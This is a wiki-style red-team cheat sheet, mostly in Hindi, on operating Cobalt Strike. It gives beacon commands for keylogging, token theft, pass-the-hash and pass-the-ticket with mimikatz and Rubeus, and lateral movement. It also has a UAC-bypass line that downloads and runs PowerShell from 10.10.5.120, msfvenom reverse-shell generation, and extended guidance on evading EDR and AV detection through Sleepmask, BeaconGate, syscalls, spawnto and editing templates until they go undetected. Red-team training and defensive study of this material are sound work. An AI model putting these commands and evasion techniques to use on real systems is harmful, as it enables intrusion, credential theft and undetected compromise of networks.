# Cobalt Strike

{{#include ../banners/hacktricks-training.md}}

### Listeners

### C2 Listeners

`Cobalt Strike -> Listeners -> Add/Edit` पर जाएँ। इसके बाद आप चुन सकते हैं कि कहाँ listen करना है, किस तरह का beacon इस्तेमाल करना है (http, dns, smb...) और भी बहुत कुछ।

### Peer2Peer Listeners

इन listeners के beacons को सीधे C2 से बात करने की ज़रूरत नहीं होती; वे अन्य beacons के ज़रिए उससे communicate कर सकते हैं।

`Cobalt Strike -> Listeners -> Add/Edit` पर जाएँ। इसके बाद आपको TCP या SMB beacons चुनने होंगे।

* **TCP beacon चुने गए port पर listener सेट करेगा**। TCP beacon से connect करने के लिए किसी दूसरे beacon से `connect <ip> <port>` command का इस्तेमाल करें।
* **SMB beacon चुने गए नाम वाले pipename पर listen करेगा**। SMB beacon से connect करने के लिए `link [target] [pipe]` command का इस्तेमाल करें।

### payload generate और host करना

#### files में payload generate करना

`Attacks -> Packages ->`

* HTA files के लिए **`HTMLApplication`**
* macro वाले office document के लिए **`MS Office Macro`**
* .exe, .dll या service .exe के लिए **`Windows Executable`**
* **stageless** .exe, .dll या service .exe के लिए **`Windows Executable (S)`** (staged की तुलना में stageless बेहतर है; IoCs कम होते हैं)

#### payload generate और host करना

`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` यह cobalt strike से beacon download करने के लिए bitsadmin, exe, powershell और python जैसे formats में script/executable generate करेगा।

#### payloads host करना

अगर आपके पास वह file पहले से है जिसे आप किसी web server पर host करना चाहते हैं, तो `Attacks -> Web Drive-by -> Host File` पर जाएँ और host करने के लिए file तथा web server config चुनें।

### Beacon के विकल्प

<details>
<summary>Beacon के विकल्प और commands</summary>

```bash
# Execute local .NET binary
execute-assembly </path/to/executable.exe>
# Note that to load assemblies larger than 1MB, the 'tasks_max_size' property of the malleable profile needs to be modified.

# Screenshots
printscreen    # Take a single screenshot via PrintScr method
screenshot     # Take a single screenshot
screenwatch    # Take periodic screenshots of desktop
## Go to View -> Screenshots to see them

# keylogger
keylogger [pid] [x86|x64]
## View > Keystrokes to see the keys pressed

# portscan
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Inject portscan action inside another process
portscan [targets] [ports] [arp|icmp|none] [max connections]

# Powershell
## Import Powershell module
powershell-import C:\path\to\PowerView.ps1
powershell-import /root/Tools/PowerSploit/Privesc/PowerUp.ps1
powershell <just write powershell cmd here> # Uses the highest supported PowerShell version (not OPSEC-friendly)
powerpick <cmdlet> <args> # This creates a sacrificial process specified by spawnto, and injects UnmanagedPowerShell into it for better opsec (not logging)
powerpick Invoke-PrivescAudit | fl
psinject <pid> <arch> <commandlet> <arguments> # This injects UnmanagedPowerShell into the specified process to run the PowerShell cmdlet.


# User impersonation
## Token generation with creds
make_token [DOMAIN\user] [password] #Create token to impersonate a user in the network
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token generated with make_token
## The use of make_token generates event 4624: An account was successfully logged on.  This event is very common in a Windows domain, but can be narrowed down by filtering on the Logon Type.  As mentioned above, it uses LOGON32_LOGON_NEW_CREDENTIALS which is type 9.

# UAC Bypass
elevate svc-exe <listener>
elevate uac-token-duplication <listener>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## Steal token from pid
## Like make_token but stealing the token from a process
steal_token [pid] # Also, this is useful for network actions, not local actions
## From the API documentation we know that this logon type "allows the caller to clone its current token". This is why the Beacon output says Impersonated <current_username> - it's impersonating our own cloned token.
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token from steal_token

## Launch process with nwe credentials
spawnas [domain\username] [password] [listener] #Do it from a directory with read access like: cd C:\
## Like make_token, this will generate Windows event 4624: An account was successfully logged on but with a logon type of 2 (LOGON32_LOGON_INTERACTIVE).  It will detail the calling user (TargetUserName) and the impersonated user (TargetOutboundUserName).

## Inject into process
inject [pid] [x64|x86] [listener]
## From an OpSec point of view: Don't perform cross-platform injection unless you really have to (e.g. x86 -> x64 or x64 -> x86).

## Pass the hash
## This modification process requires patching of LSASS memory which is a high-risk action, requires local admin privileges and not all that viable if Protected Process Light (PPL) is enabled.
pth [pid] [arch] [DOMAIN\user] [NTLM hash]
pth [DOMAIN\user] [NTLM hash]

## Pass the hash through mimikatz
mimikatz sekurlsa::pth /user:<username> /domain:<DOMAIN> /ntlm:<NTLM HASH> /run:"powershell -w hidden"
## Without /run, Mimikatz spawns cmd.exe; an interactive desktop user may see the shell (SYSTEM sessions are not normally visible)
steal_token <pid> #Steal token from process created by mimikatz

## Pass the ticket
## Request a ticket
execute-assembly /root/Tools/SharpCollection/Seatbelt.exe -group=system
execute-assembly C:\path\Rubeus.exe asktgt /user:<username> /domain:<domain> /aes256:<aes_keys> /nowrap /opsec
## Create a new logon session to use with the new ticket (to not overwrite the compromised one)
make_token <domain>\<username> DummyPass
## Write the ticket on the attacker machine from a PowerShell session and load it
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi

## Pass the ticket from SYSTEM
## Generate a new process with the ticket
execute-assembly C:\path\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
## Steal the token from that process
steal_token <pid>

## Extract ticket + Pass the ticket
### List tickets
execute-assembly C:\path\Rubeus.exe triage
### Dump an interesting ticket by LUID
execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
### Create new logon session, note luid and processid
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### Insert ticket in generate logon session
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
### Finally, steal the token from that new process
steal_token <pid>

# Lateral Movement
## If a token was created it will be used
jump [method] [target] [listener]
## Methods:
## psexec                    x86   Use a service to run a Service EXE artifact
## psexec64                  x64   Use a service to run a Service EXE artifact
## psexec_psh                x86   Use a service to run a PowerShell one-liner
## winrm                     x86   Run a PowerShell script via WinRM
## winrm64                   x64   Run a PowerShell script via WinRM
## wmi_msbuild               x64   WMI lateral movement with an MSBuild inline C# task (OPSEC)


remote-exec [method] [target] [command] # remote-exec doesn't return output
## Methods:
## psexec                          Remote execute via Service Control Manager
## winrm                           Remote execute via WinRM (PowerShell)
## wmi                             Remote execute via WMI

## To execute a beacon with wmi (it isn't in the jump command) just upload the beacon and execute it
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe


# Pass session to Metasploit - Through listener
## On the Metasploit host
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## On cobalt: Listeners > Add and set the Payload to Foreign HTTP. Set the Host to 10.10.5.120, the Port to 8080 and click Save.
beacon> spawn metasploit
## You can only spawn x86 Meterpreter sessions with the foreign listener.

# Pass session to Metasploit - Through shellcode injection
## On metasploit host
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> -f raw -o /tmp/msf.bin
## Run msfvenom and prepare the multi/handler listener

## Copy bin file to cobalt strike host
ps
shinject <pid> x64 C:\Payloads\msf.bin #Inject metasploit shellcode in a x64 process

# Pass metasploit session to cobalt strike
## Generate stageless Beacon shellcode: go to Attacks > Packages > Windows Executable (S), select the listener, choose Raw output, and enable the x64 payload.
## Use post/windows/manage/shellcode_inject in metasploit to inject the generated cobalt srike shellcode


# Pivoting
## Open a socks proxy in the teamserver
beacon> socks 1080

# SSH connection
beacon> ssh 10.10.17.12:22 username password
```

</details>

### Custom implants / Linux Beacons

- एक custom agent को register/check-in करने और tasks प्राप्त करने के लिए केवल Cobalt Strike Team Server HTTP/S protocol (default malleable C2 profile) से communicate करना होता है। Cobalt Strike UI का उपयोग करके tasking और output संभालने के लिए profile में परिभाषित समान URIs/headers/metadata crypto लागू करें।<sup>[[1]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>
- एक Aggressor Script (जैसे, `CustomBeacon.cna`) non-Windows beacon के लिए payload generation को wrap कर सकती है, ताकि operators listener चुन सकें और GUI से सीधे ELF payloads बना सकें।
- Team Server के सामने उपलब्ध Linux task handlers के उदाहरण: `sleep`, `cd`, `pwd`, `shell` (arbitrary commands चलाना), `ls`, `upload`, `download`, और `exit`। ये Team Server द्वारा अपेक्षित task IDs से मेल खाते हैं और सही format में output लौटाने के लिए इन्हें server-side लागू करना ज़रूरी है।
- Linux पर BOF support, [TrustedSec's ELFLoader](https://github.com/trustedsec/ELFLoader) का उपयोग करके Beacon Object Files को in-process लोड करके जोड़ा जा सकता है (यह Outflank-style BOFs को भी support करता है)। इससे नए processes शुरू किए बिना, implant के context/privileges में modular post-exploitation चलाया जा सकता है।<sup>[[2]](#references)[[3]](#references)</sup>
  अलग BOF tasking example के साथ Linux loader-format और process-boundary से जुड़ी सावधानियों के लिए, देखें [Linux BOF loader formats and process boundaries](../linux-hardening/post-exploitation/linux-fileless-execution.md#linux-bof-loader-formats-and-process-boundaries)।
- Windows Beacons जैसी pivoting क्षमता बनाए रखने के लिए custom beacon में SOCKS handler embed करें: जब operator `socks <port>` चलाए, तो implant को एक local proxy खोलना चाहिए, जो operator के tools को compromised Linux host से होते हुए internal networks तक route करे।

## Opsec

### Execute-Assembly

**`execute-assembly`** में बताए गए program को execute करने के लिए remote process injection के ज़रिए एक **sacrificial process** का उपयोग किया जाता है। यह बहुत noisy है, क्योंकि किसी process के अंदर inject करने के लिए कुछ Win APIs का उपयोग होता है, जिन्हें हर EDR जाँचता है। हालाँकि, कुछ custom tools हैं जिनका उपयोग उसी process में कुछ load करने के लिए किया जा सकता है:

- [https://github.com/anthemtotheego/InlineExecute-Assembly](https://github.com/anthemtotheego/InlineExecute-Assembly)
- [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)
- Cobalt Strike में BOF (Beacon Object Files) का भी उपयोग किया जा सकता है: [https://github.com/CCob/BOF.NET](https://github.com/CCob/BOF.NET)

Agressor script `https://github.com/outflanknl/HelpColor`, Cobalt Strike में `helpx` command बनाएगी। यह commands को रंगों से चिह्नित करेगी: BOFs के लिए हरा, Frok&Run और इसी तरह के लिए पीला, तथा ProcessExecution, injection और इसी तरह के लिए लाल। इससे पता चलता है कि कौन-सी commands अधिक stealthy हैं।

### Modern in-process post-execution

हाल के versions में, जब classic COFF BOF बहुत सीमित हो, तो दो विकल्प उपलब्ध हैं:

- **Beacon Interpreter** Team Server पर C को intermediate bytecode में compile करता है और Beacon में embedded VM में execute करता है। Bytecode native executable code के बजाय data रहता है, इसलिए BOF load करने के लिए आम तौर पर आवश्यक अतिरिक्त executable allocation और RW-to-RX permission transition से बचा जा सकता है। Scripts Beacon API import कर सकती हैं और BOF-style Dynamic Function Resolution (DFR) prototypes declare कर सकती हैं।
- **BOF-PE** एक complete EXE या DLL को current Beacon में load करता है। यह format Beacon API को बनाए रखते हुए normal PE imports, exception handling, अधिक समृद्ध C++ और external libraries को support करता है। यह छोटे COFF BOF से भारी होता है, इसलिए इसका उपयोग तभी करें जब अतिरिक्त runtime उपयोगी हो।

```bash
# Compile a C script on the Team Server and execute its bytecode
beacon-interpreter /path/to/script.c

# Execute a BOF-PE in the current Beacon
inline-execute-pe /path/to/tool.x64.exe
```

ये mechanisms loader से जुड़े signals को कम करते हैं, script की actions या Windows API calls से उत्पन्न telemetry को नहीं।<sup>[[8]](#references)</sup>

### उपयोगकर्ता के रूप में कार्य करें

आप `Seatbelt.exe LogonEvents ExplicitLogonEvents PoweredOnEvents` जैसे events की जाँच कर सकते हैं:

- Security EID 4624 - सामान्य कामकाजी समय जानने के लिए सभी interactive logons की जाँच करें।
- System EID 12,13 - shutdown/startup/sleep की आवृत्ति की जाँच करें।
- Security EID 4624/4625 - आने वाले मान्य/अमान्य NTLM attempts की जाँच करें।
- Security EID 4648 - यह event तब बनता है जब logon के लिए plaintext credentials इस्तेमाल किए जाते हैं। यदि किसी process ने इसे बनाया है, तो संभव है कि binary में credentials किसी config file में या code के भीतर clear text में हों।

Cobalt Strike से `jump` का इस्तेमाल करते समय, नए process को अधिक वैध दिखाने के लिए `wmi_msbuild` method का इस्तेमाल करना बेहतर है।

### Computer accounts का इस्तेमाल करें

Defenders के लिए users के असामान्य व्यवहार की जाँच करना आम है, जबकि वे **service accounts और `*$` जैसे computer accounts को अपनी monitoring से बाहर रखते हैं**। आप इन accounts का इस्तेमाल lateral movement या privilege escalation के लिए कर सकते हैं।

### Stageless payloads का इस्तेमाल करें

Stageless payloads, staged payloads की तुलना में कम noisy होते हैं, क्योंकि उन्हें C2 server से दूसरा stage download करने की ज़रूरत नहीं होती। इसका मतलब है कि शुरुआती connection के बाद वे कोई network traffic उत्पन्न नहीं करते, जिससे network-based defenses द्वारा पकड़े जाने की संभावना कम हो जाती है।

### Tokens और Token Store

Tokens चुराते या बनाते समय सावधान रहें, क्योंकि EDR thread tokens की enumeration करके process के भीतर **किसी दूसरे user या यहाँ तक कि SYSTEM से संबंधित token** का पता लगा सकता है।

इससे tokens को **प्रति beacon** store किया जा सकता है, इसलिए एक ही token को बार-बार चुराने की ज़रूरत नहीं होती। यह lateral movement के लिए या तब उपयोगी है जब आपको चुराए गए token को कई बार इस्तेमाल करना हो:

- `token-store steal <pid>`
- `token-store steal-and-use <pid>`
- token-store show
- `token-store use <id>`
- `token-store remove <id>`
- token-store remove-all

Lateral movement करते समय, आमतौर पर **नया token बनाने या pass the hash attack करने के बजाय token चुराना** बेहतर होता है।

### Guardrails

Cobalt Strike में **Guardrails** नाम का एक feature है, जो ऐसे commands या actions के इस्तेमाल को रोकने में मदद करता है जिन्हें defenders पकड़ सकते हैं। Guardrails को `make_token`, `jump`, `remote-exec` और अन्य ऐसे commands को block करने के लिए configure किया जा सकता है, जिनका इस्तेमाल आमतौर पर lateral movement या privilege escalation के लिए होता है।

इसके अलावा, repo [https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks](https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks) में कुछ checks और ऐसे विचार भी हैं, जिन पर payload चलाने से पहले विचार किया जा सकता है।

### Tickets encryption

AD में tickets के encryption का ध्यान रखें। कुछ tools डिफ़ॉल्ट रूप से Kerberos tickets के लिए RC4 encryption का इस्तेमाल करेंगे, जो AES encryption से कम सुरक्षित है। डिफ़ॉल्ट रूप से, up-to-date environments AES का इस्तेमाल करेंगे। कमजोर encryption algorithms की निगरानी करने वाले defenders इसका पता लगा सकते हैं।

### Defaults से बचें

Cobalt Strike का इस्तेमाल करते समय, डिफ़ॉल्ट रूप से SMB pipes के नाम `msagent_####` और `"status_####` होते हैं। इन नामों को बदलें। Cobalt Strike में इस command से मौजूदा pipes के नाम देखे जा सकते हैं: `ls \\.\pipe\`

इसके अलावा, SSH sessions के साथ `\\.\pipe\postex_ssh_####` नाम का pipe बनाया जाता है। इसे `set ssh_pipename "<new_name>";` से बदलें।

`poext` exploitation attack में भी `\\.\pipe\postex_####` pipes को `set pipename "<new_name>"` से बदला जा सकता है।

Cobalt Strike profiles में आप ये चीज़ें भी बदल सकते हैं:

- `rwx` का इस्तेमाल करने से बचना
- `process-inject {...}` block में process injection का व्यवहार (कौन-सी APIs इस्तेमाल होंगी)
- `post-ex {…}` block में "fork and run" कैसे काम करता है
- Sleep time
- Memory में load होने वाली binaries का अधिकतम आकार
- `stage {...}` block से memory footprint और DLL content
- Network traffic

### Sleepmask और BeaconGate

Sleepmask, Beacon और उसके tracked heap allocations को dormant रहने के दौरान बदलता है, फिर task execution के लिए उन्हें वापस restore करता है। मौजूदा releases में एक evasive default मिलता है, लेकिन जब memory layout, allocation या call-stack की ज़रूरतें अलग हों, तब custom Sleepmask BOFs उपयोगी रहते हैं। 4.13 से, default Sleepmask BeaconGate के ज़रिए proxy की गई APIs के return address को भी spoof करता है।<sup>[[8]](#references)</sup>

**BeaconGate** इस design को `Sleep` से आगे बढ़ाता है: चुनी गई WinAPI calls को `FUNCTION_CALL` structures के रूप में दर्शाया जाता है और Sleepmask BOF को भेजा जाता है, जो call के चलने के दौरान Beacon को mask कर सकता है। Profile किसी group (`Comms`, `Core`, `Cleanup` या `All`) या केवल अलग-अलग APIs को gate कर सकता है:<sup>[[9]](#references)</sup>

```text
stage {
    set sleep_mask "true";
    set syscall_method "Indirect";

    beacon_gate {
        VirtualAlloc;       # Routed through BeaconGate
        VirtualAllocEx;
        InternetConnectA;
    }
}
```

`beacon_gate` के अंतर्गत सूचीबद्ध API के लिए gate, `syscall_method` पर प्राथमिकता रखता है; सूचीबद्ध न किए गए API अब भी कॉन्फ़िगर किया गया syscall method इस्तेमाल कर सकते हैं। `beacon_gate disable` और `beacon_gate enable` runtime पर इस सुविधा को चालू या बंद करते हैं। `All` को बिना सोचे-समझे सक्षम न करें: `ps` जैसे commands बार-बार `OpenProcess`/`CloseHandle` कॉल करते हैं और हर कॉल पर Beacon को mask और unmask करने से CPU spike हो सकता है। Sleepmask-VS, custom gates को live implant के ज़रिए बार-बार test किए बिना debug करने के लिए mocked Beacon/Sleepmask state उपलब्ध कराता है।<sup>[[9]](#references)</sup>

### Noisy proc injections

किसी process में code inject करना आमतौर पर बहुत noisy होता है, क्योंकि **कोई भी सामान्य process आमतौर पर यह कार्रवाई नहीं करता और ऐसा करने के तरीके बहुत सीमित हैं**। इसलिए, behaviour-based detection systems इसे detect कर सकते हैं। इसके अलावा, EDRs network को **ऐसे threads के लिए scan करके भी इसे detect कर सकते हैं जिनमें ऐसा code हो जो disk पर मौजूद न हो** (हालाँकि JIT इस्तेमाल करने वाले browsers जैसे processes में यह आम बात है)। उदाहरण: [https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2)

### Spawnas | PID और PPID संबंध

नया process spawn करते समय, detection से बचने के लिए processes के बीच **सामान्य parent-child** संबंध बनाए रखना महत्वपूर्ण है। अगर svchost.exec, iexplorer.exe चला रहा हो, तो यह संदिग्ध लगेगा, क्योंकि सामान्य Windows environment में svchost.exe, iexplorer.exe का parent नहीं होता।

Cobalt Strike में नया beacon spawn करने पर, default रूप से नए listener को चलाने के लिए **`rundll32.exe`** का इस्तेमाल करने वाला process बनाया जाता है। यह बहुत stealthy नहीं है और EDRs इसे आसानी से detect कर सकते हैं। इसके अलावा, `rundll32.exe` बिना किसी args के चलाया जाता है, जिससे यह और भी संदिग्ध लगता है।

नया beacon spawn करने के लिए कोई अलग process निर्दिष्ट करने और उसे कम detectable बनाने हेतु, आप निम्न Cobalt Strike command का इस्तेमाल कर सकते हैं:

```bash
spawnto x86 svchost.exe
```

आप profile में **`spawnto_x86` और `spawnto_x64`** की यह setting भी बदल सकते हैं।

### हमलावर के traffic को proxy करना

हमलावरों को कभी-कभी tools स्थानीय रूप से चलाने में सक्षम होना पड़ता है, Linux machines पर भी, और victims का traffic उस tool तक पहुँचाना होता है (जैसे NTLM relay)।

इसके अलावा, कभी-कभी pass-the.hash या pass-the-ticket attack करने के लिए हमलावर के लिए **इस hash या ticket को अपने LSASS process में स्थानीय रूप से जोड़ना** और फिर किसी victim machine के LSASS process को modify करने के बजाय उससे pivot करना ज़्यादा stealthy होता है।

हालाँकि, आपको **जनरेट किए गए traffic को लेकर सावधान रहना होगा**, क्योंकि आप अपने backdoor process से असामान्य traffic (kerberos?) भेज रहे हो सकते हैं। इसके लिए आप browser process पर pivot कर सकते हैं (हालाँकि किसी process में खुद को inject करते हुए आप पकड़े जा सकते हैं, इसलिए ऐसा करने का कोई stealthy तरीका सोचें)।

### AVs से बचना

#### AV/AMSI/ETW Bypass

यह page देखें:

{{#ref}}
av-bypass.md
{{#endref}}


#### Artifact Kit

आमतौर पर `/opt/cobaltstrike/artifact-kit` में आपको वह code और pre-compiled templates (`/src-common` में) मिलेंगे जिनका इस्तेमाल cobalt strike binary beacons बनाने के लिए करता है।

जनरेट किए गए backdoor (या सिर्फ compiled template) पर [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) का इस्तेमाल करके आप पता लगा सकते हैं कि defender को क्या trigger कर रहा है। आमतौर पर यह कोई string होती है। इसलिए आप बस backdoor जनरेट करने वाले code को modify कर सकते हैं, ताकि वह string final binary में न दिखाई दे।

Code modify करने के बाद उसी directory से `./build.sh` चलाएँ और `dist-pipe/` folder को Windows client में `C:\Tools\cobaltstrike\ArtifactKit` पर copy करें।

```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```

Cobalt Strike को यह बताने के लिए कि वह डिस्क से उन संसाधनों का उपयोग करे जिन्हें हम चाहते हैं, न कि पहले से लोड किए गए संसाधनों का, aggressive script `dist-pipe\artifact.cna` लोड करना न भूलें।

#### Resource Kit

ResourceKit फ़ोल्डर में Cobalt Strike के script-based payloads के templates होते हैं, जिनमें PowerShell, VBA और HTA शामिल हैं।

इन templates के साथ [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) का उपयोग करके पता लगा सकते हैं कि Defender (इस मामले में AMSI) को क्या पसंद नहीं आ रहा है, और उसे संशोधित कर सकते हैं:

```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```

पहचानी गई लाइनों को संशोधित करके ऐसा template बनाया जा सकता है जिसे पकड़ा न जा सके।

`ResourceKit\resources.cna` aggressive script लोड करना न भूलें, ताकि Cobalt Strike को बताया जा सके कि वह डिस्क से हमारे इच्छित resources का उपयोग करे, न कि पहले से लोड किए गए resources का।

#### Function hooks | Syscall

Function hooking, ERDs द्वारा malicious activity का पता लगाने का एक बहुत आम तरीका है। Cobalt Strike, मानक Windows API calls के बजाय **syscalls** का उपयोग करके इन hooks को bypass करने देता है। इसके लिए **`None`** config का उपयोग करें, या **`Direct`** setting के साथ किसी function का `Nt*` version इस्तेमाल करें, या malleable profile में **`Indirect`** विकल्प के साथ `Nt*` function को बस jump करके पार करें। सिस्टम के आधार पर, कोई एक विकल्प दूसरे से ज़्यादा stealthy हो सकता है।

इसे profile में सेट किया जा सकता है या **`syscall-method`** command का उपयोग करके।

हालाँकि, इससे भी शोर हो सकता है।

Function hooks को bypass करने के लिए Cobalt Strike द्वारा दिए गए कुछ विकल्पों में से एक है, इन hooks को हटाना: [**unhook-bof**](https://github.com/Cobalt-Strike/unhook-bof).

आप यह भी जाँच सकते हैं कि कौन-से functions hooked हैं: [**https://github.com/Mr-Un1k0d3r/EDRs**](https://github.com/Mr-Un1k0d3r/EDRs) या [**https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector**](https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector)




<details>
<summary>Cobalt Strike के विविध commands</summary>

```bash
cd C:\Tools\neo4j\bin
neo4j.bat console
http://localhost:7474/ --> Change password
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL



# Change powershell
C:\Tools\cobaltstrike\ResourceKit
template.x64.ps1
# Change $var_code -> $polop
# $x --> $ar
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna

#artifact kit
cd  C:\Tools\cobaltstrike\ArtifactKit
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .


```

</details>



## References

- [1] [Cobalt Strike Linux Beacon (कस्टम implant PoC)](https://github.com/EricEsquivel/CobaltStrike-Linux-Beacon)
- [2] [TrustedSec ELFLoader & Linux BOFs](https://github.com/trustedsec/ELFLoader)
- [3] [Outflank nix BOF टेम्पलेट](https://github.com/outflanknl/nix_bof_template)
- [4] [Cobalt Strike मेटाडेटा एन्क्रिप्शन का Unit42 विश्लेषण](https://unit42.paloaltonetworks.com/cobalt-strike-metadata-encryption-decryption/)
- [5] [Cobalt Strike ट्रैफ़िक पर SANS ISC डायरी](https://isc.sans.edu/diary/27968)
- [6] [cs-decrypt-metadata-py](https://blog.didierstevens.com/2021/10/22/new-tool-cs-decrypt-metadata-py/)
- [7] [SentinelOne CobaltStrikeParser](https://github.com/Sentinel-One/CobaltStrikeParser)
- [8] [Cobalt Strike 4.13: अनुवाद में खो गया](https://www.cobaltstrike.com/blog/cobalt-strike-413-lost-in-translation)
- [9] [Cobalt Strike 4.10: BeaconGate के पार](https://www.cobaltstrike.com/blog/cobalt-strike-410-through-the-beacongate?p=6046)
{{#include ../banners/hacktricks-training.md}}
